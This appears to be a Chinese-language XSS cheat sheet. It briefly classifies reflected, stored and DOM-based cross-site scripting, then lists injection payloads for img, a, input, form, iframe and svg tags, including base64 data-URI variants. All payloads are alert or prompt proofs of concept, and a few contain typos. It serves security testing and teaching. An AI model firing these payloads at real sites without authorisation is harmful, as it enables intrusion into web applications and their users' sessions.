# XSS攻击

## XSS分类

### 反射型XSS

- 接收参数，在适当位置注入`payload`，嵌入紧接着返回的页面中执行恶意代码。

### 存储型XSS

- 页面接收参数，构造`payload`做值传入参数，将数据储存在`database`中，当`client`访问页面从数据库中请求数据时，恶意代码被调用并被嵌入页面中执行。

### DOM XSS

- 属于反射型XSS的一种，修改页面`DOM`节点，在用户操作时可执行恶意代码。

- 简单理解`DOM XSS`是在标签的属性值`DOM`事件中嵌入恶意代码



```html
<img>标签
利用方式1
<img src=javascript:alert("xss")>
<IMG SRC=javascript:alert(String.formCharCode(88,83,83))>
<img scr="URL" style='Xss:expression(alert(/xss));'
<!--CSS标记xss-->
  <img STYLE="background-image:url(javascript:alert('XSS'))">
XSS利用方式2
<img src="x" onerror=alert(1)>
<img src="1" onerror=eval("alert('xss')")>
XSS利用方式3
<img src=1 onmouseover=alert('xss')>
<a>标签
标准格式
<a href="https://www.baidu.com">baidu</a>
XSS利用方式1
<a href="javascript:alert('xss')">aa</a>
  <a href=javascript:eval(alert('xss'))>aa</a>
  <a href="javascript:aaa" onmouseover="alert(/xss/)">aa</a>
XSS利用方式2
<script>alert('xss')</script>
  <a href="" onclick=alert('xss')>aa</a>
利用方式3
<a href="" onclick=eval(alert('xss'))>aa</a>
利用方式4
<a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016>aa</a>
input标签
标准格式
<input name="name" value="">
利用方式1
<input value="" onclick=alert('xss') type="text">
利用方式2
<input name="name" value="" onmouseover=prompt('xss') bad="">
利用方式4
<input name="name" value=""><script>alert('xss')</script>
<form>标签
XSS利用方式1
<form action=javascript:alert('xss') method="get">
  <form action=javascript:alert('xss')>
XSS利用方式2
<form method=post action=aa.asp? onmouseover=prompt('xss')>
  <form method=post action=aa.asp? onmouseover=alert('xss')>
  <form action=1 onmouseover=alert('xss)>
XSS利用方式3
<!--原code-->
  <form method=post action="data:text/html;base64,<script>alert('xss')</script>">
  <!--base64编码-->
  <form method=post action="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
<iframe>标签
XSS利用方式1
<iframe src=javascript:alert('xss');height=5width=1000 /><iframe>
XSS利用方式2
<iframe src="data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"></iframe>
<!--原code-->
  <iframe src="data:text/html;base64,<script>alert('xss')</script>">
  <!--base64编码-->
  <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
XSS利用方式3
<iframe src="aaa" onmouseover=alert('xss') /><iframe>
XSS利用方式3
<iframe src="javascript&colon;prompt&lpar;`xss`&rpar;"></iframe>
svg<>标签
<svg onload=alert(1)>
```

